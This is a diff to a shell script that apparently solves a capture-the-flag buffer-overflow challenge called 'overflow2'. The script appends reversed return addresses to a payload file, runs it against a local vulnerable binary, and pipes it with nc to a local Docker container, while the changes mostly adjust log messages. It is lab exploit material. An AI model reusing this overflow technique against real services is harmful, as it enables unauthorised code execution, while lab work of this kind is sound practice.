@@ -69,7 +69,7 @@ if ! ./vuln < hexinput.bin|tee .tmp.out|grep -q "TD{.*}"; then
 	echo "found no flag - padding := $padding"
 	exit 1
 fi
-cat .tmp.out && rm .tmp.out && echo
+cat .tmp.out && rm .tmp.out
 
 echo "
 ###########################################################################
@@ -99,7 +99,7 @@ echo "FOUND ADDRESS - &ret := 0x$ret"
 echo $ret|fold -w2|tac|xxd -r -p >> hexinput.bin
 echo $addr|fold -w2|tac|xxd -r -p >> hexinput.bin
 
-echo "Executing local solution..." && echo
+echo "Executing local solution..."
 if ! ./vuln < hexinput.bin|grep "TD{.*}"; then
 	echo "found no flag - padding := $padding"
 	exit 1
@@ -116,7 +116,8 @@ if ! docker build -q -t overflow2 . > /dev/null; then
 	echo "failed build docker image - abort"
 	exit 1
 elif [ ! -z $(docker ps -aq) ]; then
-	docker stop $(docker ps -aq)
+	echo "Stoping previous service..."
+	docker stop $(docker ps -aq) > /dev/null
 fi
 # Start docker container.
 id=$(docker run -d --rm --name overflow2 -p 9002:9002 overflow2)
@@ -124,16 +125,16 @@ if [ -z $id ]; then
 	echo "failed to start docker image - abort"
 	exit 1
 fi
-# Show running containers.
-docker ps -a
 
-cat hexinput.bin|nc localhost 9002
+# Only works with nc by adding a newline for gets().
+echo "" >> hexinput.bin
 
-# Container should still be running after exploit.
-docker ps -a
+echo "Executing remote docker container solution..." && echo
+nc localhost 9002 < hexinput.bin
 
 # Stop service.
-docker stop $id
+echo "Stoping service..."
+docker stop $id > /dev/null
 
 ###########################################################################
 ################################# THE END #################################
